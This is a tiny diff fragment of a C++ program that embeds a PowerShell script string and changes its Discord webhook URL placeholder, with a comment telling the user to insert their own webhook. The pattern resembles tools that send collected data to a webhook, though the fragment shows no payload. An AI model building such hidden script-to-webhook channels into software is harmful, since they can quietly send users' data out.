@@ -14,7 +14,7 @@ int main() {
     
     const std::string psScript =
     
-        "$url = \"https://discord.com/api/webhooks/your-custom-webhook\";\n"
+        "$url = \"https://discord.com/api/webhooks/blahblahblah\";\n"
 
         /*
             replace the webhook above with your custom own one
